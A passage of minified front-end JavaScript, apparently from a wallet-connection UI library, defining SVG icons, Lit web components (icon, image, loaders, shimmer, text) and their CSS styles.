      d="M2.27 11.33a6.4 6.4 0 0 1 6.4-6.4h26.66a6.4 6.4 0 0 1 6.4 6.4v1.7a6.4 6.4 0 0 1 5.34 6.3v5.34a6.4 6.4 0 0 1-5.34 6.3v1.7a6.4 6.4 0 0 1-6.4 6.4H8.67a6.4 6.4 0 0 1-6.4-6.4V11.33ZM39.6 31.07h-6.93a9.07 9.07 0 1 1 0-18.14h6.93v-1.6a4.27 4.27 0 0 0-4.27-4.26H8.67a4.27 4.27 0 0 0-4.27 4.26v21.34a4.27 4.27 0 0 0 4.27 4.26h26.66a4.27 4.27 0 0 0 4.27-4.26v-1.6Zm-6.93-16a6.93 6.93 0 0 0 0 13.86h8a4.27 4.27 0 0 0 4.26-4.26v-5.34a4.27 4.27 0 0 0-4.26-4.26h-8Z"
      clip-rule="evenodd"
    />
  </svg>
`,TPe=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 5.5c0-1.8 1.46-3.25 3.25-3.25H14.5c1.8 0 3.25 1.46 3.25 3.25v.28A3.25 3.25 0 0 1 20 8.88v2.24c0 1.45-.94 2.68-2.25 3.1v.28c0 1.8-1.46 3.25-3.25 3.25H3.25A3.25 3.25 0 0 1 0 14.5v-9Zm15.75 8.88h-2.38a4.38 4.38 0 0 1 0-8.76h2.38V5.5c0-.69-.56-1.25-1.25-1.25H3.25C2.56 4.25 2 4.81 2 5.5v9c0 .69.56 1.25 1.25 1.25H14.5c.69 0 1.25-.56 1.25-1.25v-.13Zm-2.38-6.76a2.37 2.37 0 1 0 0 4.75h3.38c.69 0 1.25-.55 1.25-1.24V8.87c0-.69-.56-1.24-1.25-1.24h-3.38Z"
    clip-rule="evenodd"
  />
</svg>`,kPe=xe`<svg fill="none" viewBox="0 0 96 67">
  <path
    fill="currentColor"
    d="M25.32 18.8a32.56 32.56 0 0 1 45.36 0l1.5 1.47c.63.62.63 1.61 0 2.22l-5.15 5.05c-.31.3-.82.3-1.14 0l-2.07-2.03a22.71 22.71 0 0 0-31.64 0l-2.22 2.18c-.31.3-.82.3-1.14 0l-5.15-5.05a1.55 1.55 0 0 1 0-2.22l1.65-1.62Zm56.02 10.44 4.59 4.5c.63.6.63 1.6 0 2.21l-20.7 20.26c-.62.61-1.63.61-2.26 0L48.28 41.83a.4.4 0 0 0-.56 0L33.03 56.21c-.63.61-1.64.61-2.27 0L10.07 35.95a1.55 1.55 0 0 1 0-2.22l4.59-4.5a1.63 1.63 0 0 1 2.27 0L31.6 43.63a.4.4 0 0 0 .57 0l14.69-14.38a1.63 1.63 0 0 1 2.26 0l14.69 14.38a.4.4 0 0 0 .57 0l14.68-14.38a1.63 1.63 0 0 1 2.27 0Z"
  />
  <path
    stroke="#000"
    stroke-opacity=".1"
    d="M25.67 19.15a32.06 32.06 0 0 1 44.66 0l1.5 1.48c.43.42.43 1.09 0 1.5l-5.15 5.05a.31.31 0 0 1-.44 0l-2.07-2.03a23.21 23.21 0 0 0-32.34 0l-2.22 2.18a.31.31 0 0 1-.44 0l-5.15-5.05a1.05 1.05 0 0 1 0-1.5l1.65-1.63ZM81 29.6l4.6 4.5c.42.41.42 1.09 0 1.5l-20.7 20.26c-.43.43-1.14.43-1.57 0L48.63 41.47a.9.9 0 0 0-1.26 0L32.68 55.85c-.43.43-1.14.43-1.57 0L10.42 35.6a1.05 1.05 0 0 1 0-1.5l4.59-4.5a1.13 1.13 0 0 1 1.57 0l14.68 14.38a.9.9 0 0 0 1.27 0l-.35-.35.35.35L47.22 29.6a1.13 1.13 0 0 1 1.56 0l14.7 14.38a.9.9 0 0 0 1.26 0L79.42 29.6a1.13 1.13 0 0 1 1.57 0Z"
  />
</svg>`,NPe=xe`
<svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<g clip-path="url(#clip0_22274_4692)">
<path d="M0 6.64C0 4.17295 0 2.93942 0.525474 2.01817C0.880399 1.39592 1.39592 0.880399 2.01817 0.525474C2.93942 0 4.17295 0 6.64 0H9.36C11.8271 0 13.0606 0 13.9818 0.525474C14.6041 0.880399 15.1196 1.39592 15.4745 2.01817C16 2.93942 16 4.17295 16 6.64V9.36C16 11.8271 16 13.0606 15.4745 13.9818C15.1196 14.6041 14.6041 15.1196 13.9818 15.4745C13.0606 16 11.8271 16 9.36 16H6.64C4.17295 16 2.93942 16 2.01817 15.4745C1.39592 15.1196 0.880399 14.6041 0.525474 13.9818C0 13.0606 0 11.8271 0 9.36V6.64Z" fill="#C7B994"/>
<path d="M4.49038 5.76609C6.42869 3.86833 9.5713 3.86833 11.5096 5.76609L11.7429 5.99449C11.8398 6.08938 11.8398 6.24323 11.7429 6.33811L10.9449 7.11942C10.8964 7.16686 10.8179 7.16686 10.7694 7.11942L10.4484 6.80512C9.09617 5.48119 6.90381 5.48119 5.5516 6.80512L5.20782 7.14171C5.15936 7.18915 5.08079 7.18915 5.03234 7.14171L4.23434 6.3604C4.13742 6.26552 4.13742 6.11167 4.23434 6.01678L4.49038 5.76609ZM13.1599 7.38192L13.8702 8.07729C13.9671 8.17217 13.9671 8.32602 13.8702 8.4209L10.6677 11.5564C10.5708 11.6513 10.4137 11.6513 10.3168 11.5564L8.04388 9.33105C8.01965 9.30733 7.98037 9.30733 7.95614 9.33105L5.6833 11.5564C5.58638 11.6513 5.42925 11.6513 5.33234 11.5564L2.12982 8.42087C2.0329 8.32598 2.0329 8.17213 2.12982 8.07724L2.84004 7.38188C2.93695 7.28699 3.09408 7.28699 3.191 7.38188L5.46392 9.60726C5.48815 9.63098 5.52743 9.63098 5.55166 9.60726L7.82447 7.38188C7.92138 7.28699 8.07851 7.28699 8.17543 7.38187L10.4484 9.60726C10.4726 9.63098 10.5119 9.63098 10.5361 9.60726L12.809 7.38192C12.9059 7.28703 13.063 7.28703 13.1599 7.38192Z" fill="#202020"/>
</g>
<defs>
<clipPath id="clip0_22274_4692">
<path d="M0 8C0 3.58172 3.58172 0 8 0C12.4183 0 16 3.58172 16 8C16 12.4183 12.4183 16 8 16C3.58172 16 0 12.4183 0 8Z" fill="white"/>
</clipPath>
</defs>
</svg>
`,PPe=xe`
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
<circle cx="11" cy="11" r="11" transform="matrix(-1 0 0 1 23 1)" fill="#202020"/>
<circle cx="11" cy="11" r="11.5" transform="matrix(-1 0 0 1 23 1)" stroke="#C7B994" stroke-opacity="0.7"/>
<path d="M15.4523 11.0686L16.7472 9.78167C13.8205 6.87297 10.1838 6.87297 7.25708 9.78167L8.55201 11.0686C10.7779 8.85645 13.2279 8.85645 15.4538 11.0686H15.4523Z" fill="#C7B994"/>
<path d="M15.0199 14.067L12 11.0656L8.98 14.067L5.96004 11.0656L4.66663 12.3511L8.98 16.6393L12 13.638L15.0199 16.6393L19.3333 12.3511L18.0399 11.0656L15.0199 14.067Z" fill="#C7B994"/>
</svg>
`,$Pe=xe`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    d="M11 6.67a1 1 0 1 0-2 0v2.66a1 1 0 0 0 2 0V6.67ZM10 14.5a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5Z"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M10 1a9 9 0 1 0 0 18 9 9 0 0 0 0-18Zm-7 9a7 7 0 1 1 14 0 7 7 0 0 1-14 0Z"
    clip-rule="evenodd"
  />
</svg>`,tq=xe`<svg fill="none" viewBox="0 0 41 40">
  <g clip-path="url(#a)">
    <path fill="#000" d="M.8 0h40v40H.8z" />
    <path
      fill="#fff"
      d="m22.63 18.46 7.14-8.3h-1.69l-6.2 7.2-4.96-7.2H11.2l7.5 10.9-7.5 8.71h1.7l6.55-7.61 5.23 7.61h5.72l-7.77-11.31Zm-9.13-7.03h2.6l11.98 17.13h-2.6L13.5 11.43Z"
    />
  </g>
  <defs>
    <clipPath id="a"><path fill="#fff" d="M.8 20a20 20 0 1 1 40 0 20 20 0 0 1-40 0Z" /></clipPath>
  </defs>
</svg>`,RPe=ge`
  :host {
    display: flex;
    aspect-ratio: 1 / 1;
    color: var(--local-color);
    width: var(--local-width);
  }

  svg {
    width: inherit;
    height: inherit;
    object-fit: contain;
    object-position: center;
  }
`;var vC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const OPe={add:fNe,allWallets:pNe,arrowBottomCircle:wNe,appStore:gNe,apple:mNe,arrowBottom:bNe,arrowLeft:vNe,arrowRight:yNe,arrowTop:xNe,bank:CNe,browser:ENe,card:_Ne,checkmark:ANe,checkmarkBold:SNe,chevronBottom:INe,chevronLeft:TNe,chevronRight:kNe,chevronTop:NNe,chromeStore:PNe,clock:$Ne,close:RNe,compass:BNe,coinPlaceholder:ONe,copy:MNe,cursor:LNe,cursorTransparent:DNe,desktop:UNe,disconnect:jNe,discord:FNe,etherscan:qNe,extension:WNe,externalLink:HNe,facebook:VNe,farcaster:KNe,filters:GNe,github:ZNe,google:YNe,helpCircle:JNe,image:XNe,id:QNe,infoCircle:ePe,lightbulb:rPe,mail:iPe,mobile:nPe,more:sPe,networkPlaceholder:oPe,nftPlaceholder:aPe,off:cPe,playStore:lPe,plus:uPe,qrCode:dPe,recycleHorizontal:hPe,refresh:fPe,search:pPe,send:gPe,swapHorizontal:mPe,swapHorizontalMedium:bPe,swapHorizontalBold:wPe,swapHorizontalRoundedBold:vPe,swapVertical:yPe,telegram:xPe,threeDots:CPe,twitch:EPe,twitter:tq,twitterIcon:_Pe,verify:APe,verifyFilled:SPe,wallet:TPe,walletConnect:kPe,walletConnectLightBrown:NPe,walletConnectBrown:PPe,walletPlaceholder:IPe,warningCircle:$Pe,x:tq,info:tPe,exclamationTriangle:zNe};let eg=class extends he{constructor(){super(...arguments),this.size="md",this.name="copy",this.color="fg-300"}render(){return this.style.cssText=`
      --local-color: ${`var(--wui-color-${this.color});`}
      --local-width: ${`var(--wui-icon-size-${this.size});`}
    `,F`${OPe[this.name]}`}};eg.styles=[ht,b4,RPe];vC([V()],eg.prototype,"size",void 0);vC([V()],eg.prototype,"name",void 0);vC([V()],eg.prototype,"color",void 0);eg=vC([me("wui-icon")],eg);const BPe=ge`
  :host {
    display: block;
    width: var(--local-width);
    height: var(--local-height);
  }

  img {
    display: block;
    width: 100%;
    height: 100%;
    object-fit: cover;
    object-position: center center;
    border-radius: inherit;
  }
`;var yC=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let tg=class extends he{constructor(){super(...arguments),this.src="./path/to/image.jpg",this.alt="Image",this.size=void 0}render(){return this.style.cssText=`
      --local-width: ${this.size?`var(--wui-icon-size-${this.size});`:"100%"};
      --local-height: ${this.size?`var(--wui-icon-size-${this.size});`:"100%"};
      `,F`<img src=${this.src} alt=${this.alt} @error=${this.handleImageError} />`}handleImageError(){this.dispatchEvent(new CustomEvent("onLoadError",{bubbles:!0,composed:!0}))}};tg.styles=[ht,b4,BPe];yC([V()],tg.prototype,"src",void 0);yC([V()],tg.prototype,"alt",void 0);yC([V()],tg.prototype,"size",void 0);tg=yC([me("wui-image")],tg);const MPe=ge`
  :host {
    display: block;
    width: var(--wui-box-size-lg);
    height: var(--wui-box-size-lg);
  }

  svg {
    width: var(--wui-box-size-lg);
    height: var(--wui-box-size-lg);
    fill: none;
    stroke: transparent;
    stroke-linecap: round;
  }

  use {
    stroke: var(--wui-color-accent-100);
    stroke-width: 2px;
    stroke-dasharray: 54, 118;
    stroke-dashoffset: 172;
    animation: dash 1s linear infinite;
  }

  @keyframes dash {
    to {
      stroke-dashoffset: 0px;
    }
  }
`;var DPe=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let g7=class extends he{render(){return F`
      <svg viewBox="0 0 54 59">
        <path
          id="wui-loader-path"
          d="M17.22 5.295c3.877-2.277 5.737-3.363 7.72-3.726a11.44 11.44 0 0 1 4.12 0c1.983.363 3.844 1.45 7.72 3.726l6.065 3.562c3.876 2.276 5.731 3.372 7.032 4.938a11.896 11.896 0 0 1 2.06 3.63c.683 1.928.688 4.11.688 8.663v7.124c0 4.553-.005 6.735-.688 8.664a11.896 11.896 0 0 1-2.06 3.63c-1.3 1.565-3.156 2.66-7.032 4.937l-6.065 3.563c-3.877 2.276-5.737 3.362-7.72 3.725a11.46 11.46 0 0 1-4.12 0c-1.983-.363-3.844-1.449-7.72-3.726l-6.065-3.562c-3.876-2.276-5.731-3.372-7.032-4.938a11.885 11.885 0 0 1-2.06-3.63c-.682-1.928-.688-4.11-.688-8.663v-7.124c0-4.553.006-6.735.688-8.664a11.885 11.885 0 0 1 2.06-3.63c1.3-1.565 3.156-2.66 7.032-4.937l6.065-3.562Z"
        />
        <use xlink:href="#wui-loader-path"></use>
      </svg>
    `}};g7.styles=[ht,MPe];g7=DPe([me("wui-loading-hexagon")],g7);const LPe=ge`
  :host {
    display: flex;
  }

  :host([data-size='sm']) > svg {
    width: 12px;
    height: 12px;
  }

  :host([data-size='md']) > svg {
    width: 16px;
    height: 16px;
  }

  :host([data-size='lg']) > svg {
    width: 24px;
    height: 24px;
  }

  :host([data-size='xl']) > svg {
    width: 32px;
    height: 32px;
  }

  svg {
    animation: rotate 2s linear infinite;
  }

  circle {
    fill: none;
    stroke: var(--local-color);
    stroke-width: 4px;
    stroke-dasharray: 1, 124;
    stroke-dashoffset: 0;
    stroke-linecap: round;
    animation: dash 1.5s ease-in-out infinite;
  }

  :host([data-size='md']) > svg > circle {
    stroke-width: 6px;
  }

  :host([data-size='sm']) > svg > circle {
    stroke-width: 8px;
  }

  @keyframes rotate {
    100% {
      transform: rotate(360deg);
    }
  }

  @keyframes dash {
    0% {
      stroke-dasharray: 1, 124;
      stroke-dashoffset: 0;
    }

    50% {
      stroke-dasharray: 90, 124;
      stroke-dashoffset: -35;
    }

    100% {
      stroke-dashoffset: -125;
    }
  }
`;var RR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Rw=class extends he{constructor(){super(...arguments),this.color="accent-100",this.size="lg"}render(){return this.style.cssText=`--local-color: ${this.color==="inherit"?"inherit":`var(--wui-color-${this.color})`}`,this.dataset.size=this.size,F`<svg viewBox="25 25 50 50">
      <circle r="20" cy="50" cx="50"></circle>
    </svg>`}};Rw.styles=[ht,LPe];RR([V()],Rw.prototype,"color",void 0);RR([V()],Rw.prototype,"size",void 0);Rw=RR([me("wui-loading-spinner")],Rw);const UPe=ge`
  :host {
    display: block;
    width: var(--wui-box-size-md);
    height: var(--wui-box-size-md);
  }

  svg {
    width: var(--wui-box-size-md);
    height: var(--wui-box-size-md);
  }

  rect {
    fill: none;
    stroke: var(--wui-color-accent-100);
    stroke-width: 4px;
    stroke-linecap: round;
    animation: dash 1s linear infinite;
  }

  @keyframes dash {
    to {
      stroke-dashoffset: 0px;
    }
  }
`;var gee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let Yv=class extends he{constructor(){super(...arguments),this.radius=36}render(){return this.svgLoaderTemplate()}svgLoaderTemplate(){const e=this.radius>50?50:this.radius,i=36-e,n=116+i,s=245+i,o=360+i*1.75;return F`
      <svg viewBox="0 0 110 110" width="110" height="110">
        <rect
          x="2"
          y="2"
          width="106"
          height="106"
          rx=${e}
          stroke-dasharray="${n} ${s}"
          stroke-dashoffset=${o}
        />
      </svg>
    `}};Yv.styles=[ht,UPe];gee([V({type:Number})],Yv.prototype,"radius",void 0);Yv=gee([me("wui-loading-thumbnail")],Yv);const jPe=ge`
  :host {
    display: block;
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
    background: linear-gradient(
      120deg,
      var(--wui-color-bg-200) 5%,
      var(--wui-color-bg-200) 48%,
      var(--wui-color-bg-300) 55%,
      var(--wui-color-bg-300) 60%,
      var(--wui-color-bg-300) calc(60% + 10px),
      var(--wui-color-bg-200) calc(60% + 12px),
      var(--wui-color-bg-200) 100%
    );
    background-size: 250%;
    animation: shimmer 3s linear infinite reverse;
  }

  :host([variant='light']) {
    background: linear-gradient(
      120deg,
      var(--wui-color-bg-150) 5%,
      var(--wui-color-bg-150) 48%,
      var(--wui-color-bg-200) 55%,
      var(--wui-color-bg-200) 60%,
      var(--wui-color-bg-200) calc(60% + 10px),
      var(--wui-color-bg-150) calc(60% + 12px),
      var(--wui-color-bg-150) 100%
    );
    background-size: 250%;
  }

  @keyframes shimmer {
    from {
      background-position: -250% 0;
    }
    to {
      background-position: 250% 0;
    }
  }
`;var v4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let ap=class extends he{constructor(){super(...arguments),this.width="",this.height="",this.borderRadius="m",this.variant="default"}render(){return this.style.cssText=`
      width: ${this.width};
      height: ${this.height};
      border-radius: ${`clamp(0px,var(--wui-border-radius-${this.borderRadius}), 40px)`};
    `,F`<slot></slot>`}};ap.styles=[jPe];v4([V()],ap.prototype,"width",void 0);v4([V()],ap.prototype,"height",void 0);v4([V()],ap.prototype,"borderRadius",void 0);v4([V()],ap.prototype,"variant",void 0);ap=v4([me("wui-shimmer")],ap);/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const mee={ATTRIBUTE:1,CHILD:2},OR=r=>(...e)=>({_$litDirective$:r,values:e});let wee=class{constructor(e){}get _$AU(){return this._$AM._$AU}_$AT(e,t,i){this._$Ct=e,this._$AM=t,this._$Ci=i}_$AS(e,t){return this.update(e,t)}update(e,t){return this.render(...t)}};/**
 * @license
 * Copyright 2018 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const Ow=OR(class extends wee{constructor(r){if(super(r),r.type!==mee.ATTRIBUTE||r.name!=="class"||r.strings?.length>2)throw Error("`classMap()` can only be used in the `class` attribute and must be the only part in the attribute.")}render(r){return" "+Object.keys(r).filter(e=>r[e]).join(" ")+" "}update(r,[e]){if(this.st===void 0){this.st=new Set,r.strings!==void 0&&(this.nt=new Set(r.strings.join(" ").split(/\s/).filter(i=>i!=="")));for(const i in e)e[i]&&!this.nt?.has(i)&&this.st.add(i);return this.render(e)}const t=r.element.classList;for(const i of this.st)i in e||(t.remove(i),this.st.delete(i));for(const i in e){const n=!!e[i];n===this.st.has(i)||this.nt?.has(i)||(n?(t.add(i),this.st.add(i)):(t.remove(i),this.st.delete(i)))}return h0}}),FPe=ge`
  :host {
    display: inline-flex !important;
  }

  slot {
    width: 100%;
    display: inline-block;
    font-style: normal;
    font-family: var(--wui-font-family);
    font-feature-settings:
      'tnum' on,
      'lnum' on,
      'case' on;
    line-height: 130%;
    font-weight: var(--wui-font-weight-regular);
    overflow: inherit;
    text-overflow: inherit;
    text-align: var(--local-align);
    color: var(--local-color);
  }

  .wui-line-clamp-1 {
    overflow: hidden;
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 1;
  }

  .wui-line-clamp-2 {
    overflow: hidden;
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 2;
  }

  .wui-font-medium-400 {
    font-size: var(--wui-font-size-medium);
    font-weight: var(--wui-font-weight-light);
    letter-spacing: var(--wui-letter-spacing-medium);
  }

  .wui-font-medium-600 {
    font-size: var(--wui-font-size-medium);
    letter-spacing: var(--wui-letter-spacing-medium);
  }

  .wui-font-title-600 {
    font-size: var(--wui-font-size-title);
    letter-spacing: var(--wui-letter-spacing-title);
  }

  .wui-font-title-6-600 {
    font-size: var(--wui-font-size-title-6);
    letter-spacing: var(--wui-letter-spacing-title-6);
  }

  .wui-font-mini-700 {
    font-size: var(--wui-font-size-mini);
    letter-spacing: var(--wui-letter-spacing-mini);
    text-transform: uppercase;
  }

  .wui-font-large-500,
  .wui-font-large-600,
  .wui-font-large-700 {
    font-size: var(--wui-font-size-large);
    letter-spacing: var(--wui-letter-spacing-large);
  }

  .wui-font-2xl-500,
  .wui-font-2xl-600,
  .wui-font-2xl-700 {
    font-size: var(--wui-font-size-2xl);
    letter-spacing: var(--wui-letter-spacing-2xl);
  }

  .wui-font-paragraph-400,
  .wui-font-paragraph-500,
  .wui-font-paragraph-600,
  .wui-font-paragraph-700 {
    font-size: var(--wui-font-size-paragraph);
    letter-spacing: var(--wui-letter-spacing-paragraph);
  }

  .wui-font-small-400,
  .wui-font-small-500,
  .wui-font-small-600 {
    font-size: var(--wui-font-size-small);
    letter-spacing: var(--wui-letter-spacing-small);
  }

  .wui-font-tiny-400,
  .wui-font-tiny-500,
  .wui-font-tiny-600 {
    font-size: var(--wui-font-size-tiny);
    letter-spacing: var(--wui-letter-spacing-tiny);
  }

  .wui-font-micro-700,
  .wui-font-micro-600 {
    font-size: var(--wui-font-size-micro);
    letter-spacing: var(--wui-letter-spacing-micro);
    text-transform: uppercase;
  }

  .wui-font-tiny-400,
  .wui-font-small-400,
  .wui-font-medium-400,
  .wui-font-paragraph-400 {
    font-weight: var(--wui-font-weight-light);
  }

  .wui-font-large-700,
  .wui-font-paragraph-700,
  .wui-font-micro-700,
  .wui-font-mini-700 {
    font-weight: var(--wui-font-weight-bold);
  }

  .wui-font-medium-600,
  .wui-font-medium-title-600,
  .wui-font-title-6-600,
  .wui-font-large-600,
  .wui-font-paragraph-600,
  .wui-font-small-600,
  .wui-font-tiny-600,
  .wui-font-micro-600 {
    font-weight: var(--wui-font-weight-medium);
  }

  :host([disabled]) {
    opacity: 0.4;
  }
`;var y4=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let cp=class extends he{constructor(){super(...arguments),this.variant="paragraph-500",this.color="fg-300",this.align="left",this.lineClamp=void 0}render(){const e={[`wui-font-${this.variant}`]:!0,[`wui-color-${this.color}`]:!0,[`wui-line-clamp-${this.lineClamp}`]:!!this.lineClamp};return this.style.cssText=`
      --local-align: ${this.align};
      --local-color: var(--wui-color-${this.color});
    `,F`<slot class=${Ow(e)}></slot>`}};cp.styles=[ht,FPe];y4([V()],cp.prototype,"variant",void 0);y4([V()],cp.prototype,"color",void 0);y4([V()],cp.prototype,"align",void 0);y4([V()],cp.prototype,"lineClamp",void 0);cp=y4([me("wui-text")],cp);const qPe=xe`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#1DC956" rx="30" />
  <circle cx="30" cy="30" r="3" fill="#fff" />
  <path
    fill="#2BEE6C"
    stroke="#fff"
    stroke-width="2"
    d="m45.32 17.9-.88-.42.88.42.02-.05c.1-.2.21-.44.26-.7l-.82-.15.82.16a2 2 0 0 0-.24-1.4c-.13-.23-.32-.42-.47-.57a8.42 8.42 0 0 1-.04-.04l-.04-.04a2.9 2.9 0 0 0-.56-.47l-.51.86.5-.86a2 2 0 0 0-1.4-.24c-.26.05-.5.16-.69.26l-.05.02-15.05 7.25-.1.05c-1.14.55-1.85.89-2.46 1.37a7 7 0 0 0-1.13 1.14c-.5.6-.83 1.32-1.38 2.45l-.05.11-7.25 15.05-.02.05c-.1.2-.21.43-.26.69a2 2 0 0 0 .24 1.4l.85-.5-.85.5c.13.23.32.42.47.57l.04.04.04.04c.15.15.34.34.56.47a2 2 0 0 0 1.41.24l-.2-.98.2.98c.25-.05.5-.17.69-.26l.05-.02-.42-.87.42.87 15.05-7.25.1-.05c1.14-.55 1.85-.89 2.46-1.38a7 7 0 0 0 1.13-1.13 12.87 12.87 0 0 0 1.43-2.56l7.25-15.05Z"
  />
  <path
    fill="#1DC956"
    d="M33.38 32.72 30.7 29.3 15.86 44.14l.2.2a1 1 0 0 0 1.14.2l15.1-7.27a3 3 0 0 0 1.08-4.55Z"
  />
  <path
    fill="#86F999"
    d="m26.62 27.28 2.67 3.43 14.85-14.85-.2-.2a1 1 0 0 0-1.14-.2l-15.1 7.27a3 3 0 0 0-1.08 4.55Z"
  />
  <circle cx="30" cy="30" r="3" fill="#fff" transform="rotate(45 30 30)" />
  <rect width="59" height="59" x=".5" y=".5" stroke="#062B2B" stroke-opacity=".1" rx="29.5" />
</svg> `,zPe=xe`<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 40" fill="none">
  <g clip-path="url(#clip0_187_29)">
    <path d="M1.18187e-05 15.8055C1.18187e-05 9.8015 -5.19442e-07 6.91338 1.69991e-08 0C4.5 3.72236e-05 9.62249 0 16.5 0L23.5 4.31399e-05C29.9349 4.31399e-05 35.5 0.000206332 40 3.73468e-05C40 2.77754 40 9.36708 40 15.8055V22.8364C40 29.2647 40 33.7962 40 40C31.5 40 29.8337 40 23.4 40H16.6C10.5092 40 6.50004 40 4.04289e-05 40C3.05176e-05 32.2453 1.18187e-05 29.6382 1.18187e-05 22.8364V15.8055Z" fill="#0052FF"/>
    <path d="M20.0236 26.5C16.4342 26.5 13.5236 23.5931 13.5236 20C13.5236 16.4069 16.4342 13.5 20.0236 13.5C23.2411 13.5 25.9134 15.8472 26.4261 18.9167H32.9731C32.4206 12.2433 26.8342 7 20.02 7C12.8411 7 7.02002 12.8211 7.02002 20C7.02002 27.1789 12.8411 33 20.02 33C26.8342 33 32.4206 27.7567 32.9731 21.0833H26.4225C25.9061 24.1528 23.2411 26.5 20.0236 26.5Z" fill="white"/>
  </g>
  <defs>
    <clipPath id="clip0_187_29">
      <rect width="40" height="40" fill="white"/>
    </clipPath>
  </defs>
</svg>`,WPe=xe`<svg viewBox="0 0 60 60" fill="none">
  <g clip-path="url(#clip0_7734_50402)">
    <path
      d="M0 24.9C0 15.6485 0 11.0228 1.97053 7.56812C3.3015 5.23468 5.23468 3.3015 7.56812 1.97053C11.0228 0 15.6485 0 24.9 0H35.1C44.3514 0 48.9772 0 52.4319 1.97053C54.7653 3.3015 56.6985 5.23468 58.0295 7.56812C60 11.0228 60 15.6485 60 24.9V35.1C60 44.3514 60 48.9772 58.0295 52.4319C56.6985 54.7653 54.7653 56.6985 52.4319 58.0295C48.9772 60 44.3514 60 35.1 60H24.9C15.6485 60 11.0228 60 7.56812 58.0295C5.23468 56.6985 3.3015 54.7653 1.97053 52.4319C0 48.9772 0 44.3514 0 35.1V24.9Z"
      fill="#EB8B47"
    />
    <path
      d="M0.5 24.9C0.5 20.2652 0.50047 16.8221 0.744315 14.105C0.987552 11.3946 1.46987 9.45504 2.40484 7.81585C3.69145 5.56019 5.56019 3.69145 7.81585 2.40484C9.45504 1.46987 11.3946 0.987552 14.105 0.744315C16.8221 0.50047 20.2652 0.5 24.9 0.5H35.1C39.7348 0.5 43.1779 0.50047 45.895 0.744315C48.6054 0.987552 50.545 1.46987 52.1841 2.40484C54.4398 3.69145 56.3086 5.56019 57.5952 7.81585C58.5301 9.45504 59.0124 11.3946 59.2557 14.105C59.4995 16.8221 59.5 20.2652 59.5 24.9V35.1C59.5 39.7348 59.4995 43.1779 59.2557 45.895C59.0124 48.6054 58.5301 50.545 57.5952 52.1841C56.3086 54.4398 54.4398 56.3086 52.1841 57.5952C50.545 58.5301 48.6054 59.0124 45.895 59.2557C43.1779 59.4995 39.7348 59.5 35.1 59.5H24.9C20.2652 59.5 16.8221 59.4995 14.105 59.2557C11.3946 59.0124 9.45504 58.5301 7.81585 57.5952C5.56019 56.3086 3.69145 54.4398 2.40484 52.1841C1.46987 50.545 0.987552 48.6054 0.744315 45.895C0.50047 43.1779 0.5 39.7348 0.5 35.1V24.9Z"
      stroke="#062B2B"
      stroke-opacity="0.1"
    />
    <path
      d="M19 52C24.5228 52 29 47.5228 29 42C29 36.4772 24.5228 32 19 32C13.4772 32 9 36.4772 9 42C9 47.5228 13.4772 52 19 52Z"
      fill="#FF974C"
      stroke="white"
      stroke-width="2"
